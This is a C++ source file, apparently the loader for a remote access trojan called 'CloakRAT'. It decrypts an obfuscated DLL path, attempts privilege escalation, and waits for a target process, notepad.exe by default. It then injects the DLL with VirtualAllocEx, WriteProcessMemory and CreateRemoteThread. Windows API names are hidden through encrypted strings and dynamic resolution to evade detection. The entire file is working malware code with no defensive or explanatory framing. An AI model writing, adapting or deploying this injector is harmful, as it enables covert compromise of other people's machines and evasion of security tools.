#include <iostream>
#include <windows.h>
#include "utils.h"
#include "winapi_function_signatures.h"
#include "winapi_obfuscation.h"
#include "string_encryption.h"

//#define DLL_PATH "C:\\Users\\tal78\\Desktop\\Workspace\\CloakRAT\\x64\\Release\\CloakRAT.dll"
#define TARGET_EXE "notepad.exe"

int main(int argc, char** argv)
{
	// wipe dllPathString 
	std::string dllPathString = string_decrypt(str_dllPath);
	const char* dllPathCStr = dllPathString.c_str();
	const char* procName = argc <= 1 ? TARGET_EXE : argv[1];

	if (EscalatePrivilege() == -1)
	{
		std::cerr << "Failed to escalate privileges. The injection may not work!" << std::endl;
		return 1;
	}

	DWORD procID = 0;
	while (!procID) // while the process was not found
	{
		procID = GetProcessIdByName(procName);
		resolve_dynamically<Sleep_t>(str_Sleep)(300);
	}
	HANDLE hProc = resolve_dynamically<OpenProcess_t>(str_OpenProcess)(PROCESS_ALL_ACCESS, 0, procID);

	if (hProc && hProc != INVALID_HANDLE_VALUE) // if we got a handle successfully
	{
		LPVOID dllAddrInRemoteProcess = resolve_dynamically<VirtualAllocEx_t>(str_VirtualAllocEx)(hProc, NULL, strlen(dllPathCStr) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		if (dllAddrInRemoteProcess) {
			resolve_dynamically<WriteProcessMemory_t>(str_WriteProcessMemory)(hProc, dllAddrInRemoteProcess, dllPathCStr, strlen(dllPathCStr) + 1, 0);
		}
		else
		{
			std::cout << "Error: VirtualAllocEx() returned NULL: Err #" << GetLastError() << std::endl;
			return 1;
		}
		LoadLibraryA_t LoadLibraryA_addr = resolve_dynamically<LoadLibraryA_t>(str_LoadLibraryA);
		HANDLE threadHandle = resolve_dynamically<CreateRemoteThread_t>(str_CreateRemoteThread)(hProc, 0, 0, (LPTHREAD_START_ROUTINE) LoadLibraryA_addr, dllAddrInRemoteProcess, 0, 0);

		if (threadHandle == NULL)
			std::cerr << "Error in CreateRemoteThread(): Err#" << GetLastError() << std::endl;
		else
			resolve_dynamically<CloseHandle_t>(str_CloseHandle)(threadHandle);
			
	}
	else {
		std::cerr << "Error in OpenProcess(): Err#" << GetLastError() << std::endl;
	}

	return 0;

}